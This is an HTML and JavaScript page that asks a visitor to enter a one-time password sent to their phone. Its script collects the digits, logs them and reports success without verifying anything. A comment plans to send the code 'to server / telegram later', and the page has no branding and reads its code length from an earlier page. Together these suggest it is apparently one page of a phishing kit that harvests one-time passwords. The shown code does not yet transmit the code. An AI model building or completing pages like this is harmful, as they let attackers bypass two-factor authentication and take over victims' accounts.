<!DOCTYPE html>
<html>

<head>
    <title>OTP Verification</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="header"></div>

<div class="container">

    <h2 class="title">Verification</h2>

    <!-- 🔄 LOADER -->
    <div class="loader"></div>

    <p style="text-align:center; margin-top:15px;">
        OTP has been sent to your phone number.<br>
        Please enter it below to continue.
    </p>

    <!-- 🔢 OTP BOXES -->
    <div id="otpBoxes" style="display:flex; justify-content:center; gap:10px; margin-top:20px;"></div>

    <!-- BUTTON -->
    <button class="login-btn" onclick="submitOTP()">Verify OTP</button>

</div>

<div class="footer"></div>

<script>
// get OTP length (5 or 6)
const length = localStorage.getItem("otpLength") || 5;

const container = document.getElementById("otpBoxes");

// create boxes dynamically
for (let i = 0; i < length; i++) {
    const input = document.createElement("input");
    input.type = "text";
    input.maxLength = 1;
    input.className = "pin-box";

    input.style.width = "45px";
    input.style.height = "45px";
    input.style.textAlign = "center";
    input.style.fontSize = "18px";
    input.style.border = "1px solid #ccc";
    input.style.borderRadius = "5px";

    container.appendChild(input);
}

// auto move between inputs
const inputs = document.querySelectorAll(".pin-box");

inputs.forEach((input, index) => {
    input.addEventListener("input", () => {
        if (input.value.length === 1 && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
    });
});

// submit OTP
function submitOTP() {
    let otp = "";

    inputs.forEach(input => {
        otp += input.value;
    });

    if (otp.length != length) {
        alert("Enter full OTP");
        return;
    }

    // OPTIONAL: send OTP to server / telegram later
    console.log("OTP ENTERED:", otp);

    alert("OTP submitted successfully");

    // you can redirect if needed
    // window.location.href = "success.html";
}
</script>

</body>
</html>
